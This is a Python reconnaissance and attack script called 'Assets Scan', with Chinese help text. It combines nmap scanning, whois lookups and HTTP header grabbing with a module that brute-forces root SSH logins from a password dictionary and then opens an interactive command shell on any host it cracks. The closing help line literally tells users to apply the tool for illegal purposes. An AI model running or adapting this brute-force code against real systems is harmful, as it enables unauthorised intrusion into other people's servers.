import sys
import nmap
import getopt
import socket
import requests
import urllib3
import paramiko


urllib3.disable_warnings()

whois_socket_buffered = 4096
whois_query = "whois.apnic.net"
whois_port = 43

ssh_default_username = 'root'
ssh_input_char = '#'
ssh_exit_command = ['quit', 'exit', 'quit()', 'exit()']
ssh_password_dic = "./PasswordDic/top100_ssh_vps.txt"
ssh_password_list = ''


def get_password_dic(password_dic_path):
    with open(file=password_dic_path, mode='r+', encoding='utf-8') as file:
        return file.readlines()


def ssh_password_retry(host, port):
    flag = True
    password_list = get_password_dic(ssh_password_dic)
    for password in password_list:
        password = password.replace("\r", "").replace("\n", "")
        ssh_client = paramiko.SSHClient()
        try:
            ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh_client.connect(hostname=host, port=port, username=ssh_default_username, password=password)
            print(f"[{host}:{port}]爆破密码成功 -> [{password}]")
            while flag:
                ssh_command_in = input(f'[ssh@{host}:{port}]{ssh_input_char}')
                for exit_command in ssh_exit_command:
                    if ssh_command_in == exit_command:
                        print("Assets Scan 脚本退出")
                        exit(0)
                if flag:
                    stdin, stdout, stderr = ssh_client.exec_command(ssh_command_in)
                    result = stdout.read().decode('utf-8')
                    print(result)
        except paramiko.ssh_exception.AuthenticationException:
            print(f"尝试密码[{password}]错误")
        finally:
            ssh_client.close()


def default_request_headers(host):
    headers = {
        "Host": f"{host}",
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0',
        "Accept": "*/*",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1"
    }
    return headers


def http_https_request(headers, req_url, port):
    try:
        print(f"侦测到目标主机端口{port}使用TCP协议 开始尝试WEB HTTP/HTTPS 应用解析")
        req = requests.Session()
        web_response = req.get(req_url, headers=headers, verify=False)
        print(f"响应状态码: {web_response.status_code}\t响应HTTP头信息:{web_response.headers}")
        print(f"")
        req.close()
    except Exception:
        print("尝试获取HTTP/HTTPS信息失败\n")


def web_server_scanning(host, port, arguments):
    protocol_dic = {'ssh': []}
    res = nmap.PortScanner()
    res.scan(host, port, arguments=arguments)
    for host in res.all_hosts():
        print("<-------------------------------解析host信息------------------------------->")
        print(host, ":", res[host].hostname())
        print("<-------------------------------开始尝试反查域名------------------------------->")
        socket_con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket_con.connect((whois_query, whois_port))
        socket_con.send(bytes(f"{host}\r\n".encode("utf-8")))
        server_info = bytearray()
        while True:
            data = socket_con.recv(whois_socket_buffered)
            if not len(data):
                break
            server_info.extend(data)
        socket_con.close()
        print(bytes(server_info).decode("ASCII"))
        req_header = default_request_headers(host)
        for port in res[host]['tcp']:
            print(f"<---------------------获取{port}端口信息--------------------->")
            print(f"port:{port} INFO:{res[host]['tcp'][port]}")
            if res[host]['tcp'][port]['name'] == 'http':
                req_url = f"https://{res[host].hostname()}:{port}/"
                http_https_request(headers=req_header, req_url=req_url, port=port)
            elif res[host]['tcp'][port]['name'] == 'ssh':
                protocol_dic['ssh'].append({'host':host, 'port':port})
    return protocol_dic


def ssh_password_boom(ssh_dic):
    print("SSH弱口令爆破子模块启动......")
    if len(ssh_dic) == 0:
        print("未找到该主机SSH服务")
        return
    print("主机列表")
    for info in ssh_dic:
        print(f"{info['host']}:{info['port']}")
    print("在以上主机列表中选择一个你想要爆破的SSH主机IP地址")
    target = input("[选择主机]>>>")
    for item in ssh_dic:
        if item['host'] == target:
            ssh_password_retry(item['host'], item['port'])
            break


def assets_guides():
    print("----------------------欢迎使用Assets Scan帮助指南----------------------")
    print("*[必填项] -t 或 --target 参数后跟随目标IP或域名,如 -t edu.hetianlab.com")
    print("*[选填项] -p 或 --port 参数后跟随目标端口,如 -p 22 或 22-8888 此类范围端口")
    print("*[选填项] -a 或 --argument 参数后跟随补充的Nmap参数, 如 -a '-sV -Pn -T4' 默认已使用-sV 及 -Pn 参数, 详情请查看nmap相关手册")
    print("*[选填项] -s 或 --ssh_boom 可选择是否使用SSH爆破脚本, 如 -s True/False True:开启 False:不开启(默认项)")
    print("*[本手册] -h 或 --help 可返回本手册信息, 如 python Assets --help")
    print("*功能1: 开启脚本后将出发whois[域名/ip]查询及反查并给出域名解析结果")
    print("*功能2: 若发现目标服务存在TCP将会解析TCP服务")
    print("*功能3: 若发现目标TCP服务存在是HTTP/HTTPS服务将会尝试访问并返回请求结果,结果仅供参考")
    print("*功能4: 若发现目标Host包含SSH服务,将根据你的参数选择来尝试是否使用SSH爆破模块")
    print("*作者: 孙笑川")
    print("*本脚本只为渗透测试工作,一定要将工具用于非法用途,不可以偷懒哦")


if __name__ == "__main__":
    target = ''
    port = ''
    arguments = ''
    help_guide = ''
    ssh_boom = False
    opts, args = getopt.getopt(sys.argv[1:], "-t:-p:-a:-s:-h", ["target=", "port=", "arguments=", "ssh_boom=", "help"])
    for opt, arg in opts:
        if opt in ['-t', '--target']:
            target = arg
        if opt in ['-p', '--port']:
            port = arg
        if opt in ['-a', '--argument']:
            arguments = arg
        if opt in ['-s', '--ssh']:
            ssh_boom = arg
        if opt in ['-h', '--help']:
            help_guide = arg
            assets_guides()
    web_server_scanning = web_server_scanning(target, port, ' -sV -Pn '+arguments)
    if ssh_boom:
        ssh_password_boom(web_server_scanning['ssh'])



